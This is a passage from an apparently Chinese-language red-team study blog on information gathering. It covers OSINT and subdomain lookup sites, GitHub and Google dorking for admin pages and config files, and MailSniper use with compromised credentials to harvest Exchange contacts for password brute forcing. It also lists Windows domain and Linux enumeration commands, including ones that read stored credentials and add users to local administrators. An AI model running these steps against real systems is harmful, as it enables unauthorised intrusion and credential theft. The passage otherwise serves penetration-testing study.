href="https://cxsecurity.com/">https://cxsecurity.com/</a></li><li>CNVD：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li><li>securitytracker：<a href="https://www.securitytracker.com/">https://www.securitytracker.com/</a></li></ul><h3 id="Search-Exploit一DB"><a href="#Search-Exploit一DB" class="headerlink" title="Search Exploit一DB"></a>Search Exploit一DB</h3><h4 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h4><p>利用 <code>searchsploit apache 5.3.12</code> ，搜索apache漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/07.png" alt="搜索漏洞"></p><h4 id="更新最新exp库"><a href="#更新最新exp库" class="headerlink" title="更新最新exp库"></a>更新最新exp库</h4><p>命令：<code>searchsploit -u</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/08.png" alt="更新最新exp库"></p><hr><h2 id="4、开源情报信息搜集-OSINT"><a href="#4、开源情报信息搜集-OSINT" class="headerlink" title="4、开源情报信息搜集(OSINT)"></a>4、开源情报信息搜集(OSINT)</h2><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><ul><li>百度：<a href="https://www.baidu.com/">https://www.baidu.com</a></li><li>谷歌：<a href="https://www.google.com/">https://www.google.com</a></li><li>必应：<a href="https://cn.bing.com/">https://cn.bing.com</a></li></ul><h3 id="在线接口"><a href="#在线接口" class="headerlink" title="在线接口"></a>在线接口</h3><ul><li><a href="http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com">http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com</a></li><li><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></li><li><a href="http://sbd.ximcx.cn/">http://sbd.ximcx.cn/</a>  –在线子域名查询-接口光速版</li><li><a href="https://censys.io/certificates?q=.example.com">https://censys.io/certificates?q=.example.com</a></li><li><a href="https://crt.sh/?q=%25.example.com">https://crt.sh/?q=%25.example.com</a></li><li><a href="https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu">https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu</a></li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a>  –查询DNS记录、侦查、研究</li><li><a href="https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com">https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com</a>  –和第一个一样</li><li><a href="https://findsubdomains.com/">https://findsubdomains.com/</a></li><li><a href="https://dnslytics.com/search?g=www.baidu.com">https://dnslytics.com/search?g=www.baidu.com</a>   –DNSlyrics</li><li><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a>   –DNS攻击面2次免费</li><li><a href="https://viewdns.info/">https://viewdns.info/</a>   –功能很多</li><li><a href="https://www.ipneighbour.com/#/lookup/114.114.114.114">https://www.ipneighbour.com/#/lookup/114.114.114.114</a>      –邻居发现</li><li><a href="https://securitytrails.com/list/apex_domain/baidu.com">https://securitytrails.com/list/apex_domain/baidu.com</a></li><li><a href="https://url.fht.im/">https://url.fht.im/</a></li><li><a href="http://api.hackertarget.com/hostsearch/?q=baidu.com">http://api.hackertarget.com/hostsearch/?q=baidu.com</a></li><li><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a>     –云悉（限制挺大）</li></ul><p>有几个挺好用的，自行挖掘…</p><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><ul><li><a href="https://github.com/rshipp/awesome-malware-analysis/blob/master/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">https://github.com/rshipp/awesome-malware-analysis/blob/master/恶意软件分析大合集.md</a></li></ul><p>此网站极力推荐学习！！！</p><hr><h2 id="5、Github-Hacking"><a href="#5、Github-Hacking" class="headerlink" title="5、Github Hacking"></a>5、Github Hacking</h2><p>您可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有Github存储库</p><ul><li>Repositories </li><li>Topics</li><li>Issues and pull requests </li><li>Code </li><li>Commits </li><li>Users </li><li>Wikis </li></ul><p>参考 :</p><ul><li>Searching for repositories </li><li>Searching topics</li><li>Searching code </li><li>Searching commits </li><li>Searching issues and pull requests </li><li>Searching users </li><li>Searching wikis </li><li>Searching in forks </li></ul><p>可以使用以上方式<code>搜索</code>页面或<code>高级搜索</code>页面搜索Github<br>您可以使用<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，和<code>&lt;=</code>搜索是<code>大于</code>，<code>大于或等于</code>，<code>小于</code>和<code>小于或等于</code>另一个值的值<br>下面会介绍如何搜索</p><h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a><strong>搜索仓库</strong></h3><table><thead><tr><th align="center">Query</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">&gt;_n</td><td align="center">cats stars:&gt;1000匹配关键字”cats”且star大于1000的仓库</td></tr><tr><td align="center">&gt;=<em>n</em></td><td align="center">cats topIcs:&gt;=5匹配关键字”cats”且标签数量大于等于5的仓库</td></tr><tr><td align="center">&lt;_n_</td><td align="center">cats size:&lt;10000匹配关键字”cats”且文件小于10KB的仓库</td></tr><tr><td align="center">&lt;=_n_</td><td align="center">cats stars:&lt;=50匹配关键字”cats”且star小于等于50的仓库</td></tr><tr><td align="center">_n_..*</td><td align="center">cats stars:10..*匹配关键字”cats”且star大于等于10的仓库</td></tr><tr><td align="center">*.._n_</td><td align="center">cats stars:*..10匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td align="center">n..n</td><td align="center">cats stars:10..50匹配关键字”cats”且star大于10且小于50的仓库</td></tr></tbody></table><h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><p><strong>注意事项</strong></p><ul><li>只能搜索小于384KB的文件 </li><li>只能搜索少于500,000个文件的存储库，登录的用户可以搜索所有公共存储库</li><li>除filename搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索language: Javascript无效,而是这样: amazing language:Javascript </li><li>搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。您不能将以下通配符用作搜索查询的一部分“.、! “ = * ! ? # $ &amp; + ^ | ~ &lt;  &gt; ( ) { } [ ] 搜索将忽略这些符号</li></ul><p><strong>日期条件</strong></p><ul><li>cats pushed:&lt;2012-07-05 搜索在2012年07月05日前push代码，且cats作为关键字</li><li>cats pushed:2016-04-30..2016-07-04  日期区间</li><li>cats created:&gt;=2017-04-01  创建时间</li></ul><p><strong>逻辑运算</strong></p><ul><li>AND、OR、NOT</li></ul><p><strong>排除运算</strong></p><ul><li>cats pushed:&lt;2012-07-05 language:java  搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</li></ul><p><strong>包含搜索</strong></p><ul><li>cats in:file            搜索文件中包含cats的代码<ul><li>cats in:path        搜索路径中包含cats的代码 <ul><li>cats in:path,file搜索路径、文件中包含cats的代码</li></ul></li></ul></li><li>console path:app/public language:javascript  搜索关键字 console，且语言为javascript，在app/public下的代码</li></ul><p><strong>主体搜索</strong></p><ul><li>user: USERNAME                                用户名搜索<ul><li>org: ‘’ORGNAME                                组织搜索 <ul><li>repo: USERNAME/REPOSITORY指定仓库搜索 </li></ul></li></ul></li></ul><p><strong>文件大小</strong></p><ul><li>size:&gt;1000        搜索大小大于1KB的文件</li></ul><p><strong>文件名称</strong></p><p><code>filename:config.php language:php</code> 搜索文件名为<code> config.php</code>，且语言为<code>php</code>的代码<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/09.png" alt="github hacking"></p><p>搜索Java项目配置文件: <code>mail filename:.properties</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/10.png" alt="github hacking"></p><p><strong>扩展名</strong></p><p>搜索<code>extension:yaml mongolab.com</code> 中存在的代码信息等<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/11.png" alt="github hacking"></p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p><code>https://github.com/unkl4b/gitmIner</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/12.png" alt="自动化工具"></p><hr><h2 id="6、google-hacking"><a href="#6、google-hacking" class="headerlink" title="6、google hacking"></a>6、google hacking</h2><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/13.png" alt="google hacking"></p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h3><ul><li>Intitle             包含标题 <ul><li>Intext          包含内容 <ul><li>filetype     文件类型 <ul><li>Info     基本信息 <ul><li>site 指定网站 </li><li>inurl 包含某个url</li><li>link 包含指定链接的网页 </li><li>cache 显示页面的缓存版本</li></ul></li><li>numberange搜索一个数字</li></ul></li></ul></li></ul></li></ul><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><ul><li>搜索目标包含后台的页面</li></ul><p>命令：<code>inurl:/admin intext: 后台管理系统</code></p><p><code>site:&quot;some-keywords.com&quot;intitle: login intext: intext: 管理|后台|登陆|用户名|密码|验证码|系统|帐号| manage|admin|login|system</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/14.png" alt="google hacking"></p><ul><li>搜索目标是否有目录列表</li></ul><p>命令：<code>intext: index of / | ../ | Parent Directory</code></p><p><code>site:&quot;some-keywords.com&quot; intext: index of / | ../ | Parent Directory</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/15.png" alt="google hacking"></p><p>可看到存在目录列表很多url</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/16.png" alt="google hacking"></p><hr><h2 id="7、Git-all-secret"><a href="#7、Git-all-secret" class="headerlink" title="7、Git-all-secret"></a>7、Git-all-secret</h2><p>略过这个，等有精力再研究</p><hr><h2 id="8、mailsniper-ps1获取outlook所有联系人"><a href="#8、mailsniper-ps1获取outlook所有联系人" class="headerlink" title="8、mailsniper.ps1获取outlook所有联系人"></a>8、mailsniper.ps1获取outlook所有联系人</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>掌握其中一个用户邮箱的账号密码，并且可以登录outlook<br>outlook地址可以是官方的也可以是目标自己搭建的，并无影响</p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h3><p>获取目标邮箱里的所有联系人，方便后续爆破弱口令等等</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>将尝试 <code>Outlook Web Access（OWA）</code>和<code>Exchange Web服务（EWS）</code>的方法。此命令可用于从Exchange收集电子邮件列表 ：</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> <span class="hljs-string">&quot;outlook地址&quot;</span> <span class="hljs-literal">-UserName</span> <span class="hljs-string">&quot;域名/域用户名&quot;</span> <span class="hljs-literal">-Password</span> <span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-literal">-OutFile</span> global<span class="hljs-literal">-address</span><span class="hljs-literal">-list</span>.txt</code></pre><h4 id="可以自己搭建目标outlook在自己服务器上"><a href="#可以自己搭建目标outlook在自己服务器上" class="headerlink" title="可以自己搭建目标outlook在自己服务器上"></a><strong>可以自己搭建目标outlook在自己服务器上</strong></h4><p>此处使用klion的域环境模拟<br>在<code>mailsniper. ps1</code>最后一行加入以下代码,也可以通过传参的形式调用</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> mail.domain.com <span class="hljs-literal">-UserName</span> domain\username <span class="hljs-literal">-Password</span> Fall2016 <span class="hljs-literal">-OutFile</span> global<span class="hljs-literal">-address</span><span class="hljs-literal">-list</span>.txt</code></pre><p>尝试使用我们传递的账号密码去登录目标的outlook，成功登录后会把邮件里的联系人都获取下来，并输出保存到文件里</p><h4 id="目标outlook在Office365"><a href="#目标outlook在Office365" class="headerlink" title="目标outlook在Office365"></a>目标outlook在Office365</h4><p>道理也是一样的，把<code>ExchHostname</code>指向<code>outlook.office365.com</code>即可，username使用完整的邮箱不要是用户名即可</p><pre><code class="hljs css"><span class="hljs-selector-tag">Get-GlobalAddressList</span> <span class="hljs-selector-tag">-ExchHostname</span> <span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.office365</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">-Username</span> 用户名@邮箱.....</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><ul><li><a href="https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/">https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/</a></li><li><a href="https://www.cnblogs.com/backlion/p/6812690.html">https://www.cnblogs.com/backlion/p/6812690.html</a></li></ul><h3 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a><strong>工具地址</strong></h3><p><code>https://github.com/dafthack/mailsniper</code></p><hr><h2 id="9、内网渗透之信息收集"><a href="#9、内网渗透之信息收集" class="headerlink" title="9、内网渗透之信息收集"></a>9、内网渗透之信息收集</h2><h3 id="Windows（工作组和域）"><a href="#Windows（工作组和域）" class="headerlink" title="Windows（工作组和域）"></a>Windows（工作组和域）</h3><h4 id="检查当前shell权限"><a href="#检查当前shell权限" class="headerlink" title="检查当前shell权限"></a><strong>检查当前shell权限</strong></h4><pre><code class="hljs powershell">whoami /user &amp; whoami /priv</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/17.png" alt="检查当前shell权限"></p><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a><strong>查看系统信息</strong></h4><p>收集信息主机名-&gt;扮演角色</p><pre><code class="hljs powershell">systeminfo主机名:           WIN<span class="hljs-literal">-2008</span>OS 名称:          Microsoft Windows Server <span class="hljs-number">2008</span> R2 StandardOS 版本:          <span class="hljs-number">6.1</span>.<span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> Build <span class="hljs-number">7601</span>OS 制造商:        Microsoft CorporationOS 配置:          成员服务器OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:产品 ID:          <span class="hljs-number">55041</span><span class="hljs-literal">-628</span><span class="hljs-literal">-5044404</span><span class="hljs-literal">-84151</span>初始安装日期:     <span class="hljs-number">2020</span>/<span class="hljs-number">10</span>/<span class="hljs-number">14</span>, <span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">07</span>系统启动时间:     <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">19</span>, <span class="hljs-number">18</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64<span class="hljs-literal">-based</span> PC处理器:           安装了 <span class="hljs-number">1</span> 个处理器。                  [<span class="hljs-number">01</span>]: Intel64 Family <span class="hljs-number">6</span> Model <span class="hljs-number">142</span> Stepping <span class="hljs-number">10</span> GenuineIntel ~<span class="hljs-number">1992</span> MhzBIOS 版本:        Phoenix Technologies LTD <span class="hljs-number">6.00</span>, <span class="hljs-number">2020</span>/<span class="hljs-number">2</span>/<span class="hljs-number">27</span>Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh<span class="hljs-literal">-cn</span>;中文(中国)输入法区域设置:   zh<span class="hljs-literal">-cn</span>;中文(中国)时区:             (UTC+<span class="hljs-number">08</span>:<span class="hljs-number">00</span>)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     <span class="hljs-number">2</span>,<span class="hljs-number">047</span> MB可用的物理内存:   <span class="hljs-number">1</span>,<span class="hljs-number">529</span> MB虚拟内存: 最大值: <span class="hljs-number">4</span>,<span class="hljs-number">095</span> MB虚拟内存: 可用:   <span class="hljs-number">3</span>,<span class="hljs-number">562</span> MB虚拟内存: 使用中: <span class="hljs-number">533</span> MB页面文件位置:     C:\pagefile.sys域:               secice.cn登录服务器:       \\WIN<span class="hljs-literal">-2008</span>修补程序:         安装了 <span class="hljs-number">2</span> 个修补程序。                  [<span class="hljs-number">01</span>]: KB2999226                  [<span class="hljs-number">02</span>]: KB976902网卡:             安装了 <span class="hljs-number">2</span> 个 NIC。                  [<span class="hljs-number">01</span>]: Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [<span class="hljs-number">01</span>]: <span class="hljs-number">192.168</span>.<span class="hljs-number">3.101</span>                        [<span class="hljs-number">02</span>]: fe80::<span class="hljs-number">15</span>a9:e224:<span class="hljs-number">1</span>f9b:<span class="hljs-number">336</span>                  [<span class="hljs-number">02</span>]: Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection                      连接名:      本地连接 <span class="hljs-number">2</span>                      启用 DHCP:   是                      DHCP 服务器: <span class="hljs-number">192.168</span>.<span class="hljs-number">126.254</span>                      IP 地址                        [<span class="hljs-number">01</span>]: <span class="hljs-number">192.168</span>.<span class="hljs-number">126.175</span>                        [<span class="hljs-number">02</span>]: fe80::d1cb:<span class="hljs-number">2</span>aa2:fe1f:d647</code></pre><h4 id="Tcp-udp-网络连接状态信息"><a href="#Tcp-udp-网络连接状态信息" class="headerlink" title="Tcp/udp 网络连接状态信息"></a><strong>Tcp/udp 网络连接状态信息</strong></h4><p>可以获取内网IP分布状态-服务（redis)</p><pre><code class="hljs powershell">netstat <span class="hljs-literal">-ano</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/18.png" alt="Tcp/udp 网络连接状态信息"></p><h4 id="查看机器名"><a href="#查看机器名" class="headerlink" title="查看机器名"></a><strong>查看机器名</strong></h4><pre><code class="hljs powershell">hostname</code></pre><h4 id="查看当前操作系统"><a href="#查看当前操作系统" class="headerlink" title="查看当前操作系统"></a><strong>查看当前操作系统</strong></h4><pre><code class="hljs pgsql">wmic OS <span class="hljs-keyword">get</span> Caption,CSDVersion,OSArchitecture,<span class="hljs-keyword">Version</span> ver</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/19.png" alt="查看当前操作系统"></p><h4 id="查看当前安装的程序"><a href="#查看当前安装的程序" class="headerlink" title="查看当前安装的程序"></a><strong>查看当前安装的程序</strong></h4><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20.png" alt="查看当前安装的程序"></p><h4 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a><strong>查看在线用户</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">quser</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/21.png" alt="查看在线用户"></p><h4 id="查看网络配置"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a><strong>查看网络配置</strong></h4><p>有 Primary Dns Suff就说明是域内，空的则当前机器应该在工作组</p><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/22.png" alt="查看网络配置"></p><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a><strong>查看进程</strong></h4><p>有些进程可能是域用户启的-&gt;通过管理员权限凭证窃取-&gt;窃取域用户的凭证</p><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/v</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/23.png" alt="查看进程"></p><h4 id="查看当前登陆域"><a href="#查看当前登陆域" class="headerlink" title="查看当前登陆域"></a><strong>查看当前登陆域</strong></h4><pre><code class="hljs arduino">net <span class="hljs-built_in">config</span> workstation</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/24.png" alt="查看当前登陆域"></p><h4 id="远程桌面链接历史记录"><a href="#远程桌面链接历史记录" class="headerlink" title="远程桌面链接历史记录"></a><strong>远程桌面链接历史记录</strong></h4><p>可以把凭证取下来-&gt;本地解密</p><pre><code class="hljs jboss-cli">cmdkey <span class="hljs-string">/l</span></code></pre><h4 id="查看本机上的用户账户列表"><a href="#查看本机上的用户账户列表" class="headerlink" title="查看本机上的用户账户列表"></a><strong>查看本机上的用户账户列表</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title"></span></code></pre><h4 id="查看本机用户xxx的信息"><a href="#查看本机用户xxx的信息" class="headerlink" title="查看本机用户xxx的信息"></a><strong>查看本机用户xxx的信息</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span></code></pre><h4 id="查看本机用户xxx的信息-1"><a href="#查看本机用户xxx的信息-1" class="headerlink" title="查看本机用户xxx的信息"></a><strong>查看本机用户xxx的信息</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> 显示所在域的用户名单net <span class="hljs-keyword">user</span> <span class="hljs-title">域用户 /domain</span>获取某个域用户的详细信息 net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> xxx <span class="hljs-number">12345678</span> 修改域用户密码，需要域管理员权限</code></pre><hr><h3 id="Windows（域）"><a href="#Windows（域）" class="headerlink" title="Windows（域）"></a>Windows（域）</h3><pre><code class="hljs powershell">nltest /domain_trusts /all_trusts /v /server:<span class="hljs-number">192.168</span>.<span class="hljs-number">126.175</span>    返回所有信任域列表nltest /dsgetdc:secice /server:<span class="hljs-number">192.168</span>.<span class="hljs-number">3.101</span>       返回域控和其相应的IP地net user /<span class="hljs-keyword">do</span>    获取域用户列表net <span class="hljs-built_in">group</span> /domain查看域里面的组。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain查看域内所有的主机计算机名。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain admins&quot;</span> /domain查看域管理员。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain查看域控制器。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;enterprise admins&quot;</span> /domain查看企业管理组。net localgroup administrators   本机管理员[通常含有域用户]net localgroup administrators /domain    登录本机的域管理员 net localgroup administrators workgroup\user001 /add    域用户添加到本机</code></pre><pre><code class="hljs powershell">net view 查看同一域内机器列表 net view \\ip查看某IP共享net view \\GHQ    查看GHQ计算机的共享资源列表 net view /domain查看内网存在多少个域 net view /domain:XYZ查看XYZ域中的机器列表 net accounts /domain查询域用户密码过期等信息net time/domain查看时间服务器。</code></pre><p>定位域控IP</p><pre><code class="hljs powershell"><span class="hljs-number">1</span>)ipconfig /all通常域内主机 DNS 地址就是域控地址<span class="hljs-number">2</span>)查看开启 <span class="hljs-number">53</span>，<span class="hljs-number">389</span> 等端口的主机<span class="hljs-number">3</span>)net time /domain &amp;&amp; ping DC.secice.cn</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a><strong>查看当前权限</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">whoami</span></code></pre><h4 id="查看网卡配置"><a href="#查看网卡配置" class="headerlink" title="查看网卡配置"></a><strong>查看网卡配置</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span></code></pre><h4 id="查看端口状态（开启了哪些服务，内网IP连接等"><a href="#查看端口状态（开启了哪些服务，内网IP连接等" class="headerlink" title="查看端口状态（开启了哪些服务，内网IP连接等"></a><strong>查看端口状态（开启了哪些服务，内网IP连接等</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -anpt</span></code></pre><h4 id="查看进程状态（开启了哪些服务等）"><a href="#查看进程状态（开启了哪些服务等）" class="headerlink" title="查看进程状态（开启了哪些服务等）"></a><strong>查看进程状态（开启了哪些服务等）</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -ef</span></code></pre><h4 id="查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"><a href="#查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）" class="headerlink" title="查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"></a><strong>查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</strong></h4><pre><code class="hljs 